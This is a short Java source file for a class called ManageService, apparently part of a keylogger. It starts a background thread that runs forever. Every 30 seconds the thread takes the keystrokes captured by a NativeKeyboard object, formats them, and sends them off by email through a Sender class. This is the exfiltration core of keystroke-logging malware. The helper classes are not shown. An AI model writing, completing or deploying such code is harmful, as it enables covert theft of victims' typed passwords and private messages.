package handlers;

import keys.NativeKeyboard;

public class ManageService implements Runnable { 
	
	private NativeKeyboard keyboard;
	private Thread service;
	public ManageService() {
	// TODO Auto-generated constructor stub
		keyboard = new NativeKeyboard();
		service = new Thread(this, "Manage service");
		service.start();
	}
	
	public NativeKeyboard getKeyboard() {
		return keyboard;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		long start = System.nanoTime();
		while(true)
		{
			long elapsed = (System.nanoTime() - start)/1_000_000;
			if(elapsed > 30_000) {
				try {
					Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
					keyboard.onSend();
				} catch (Throwable e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					keyboard.onFail();
				}
				start = System.nanoTime();
			}
		}
	}
}
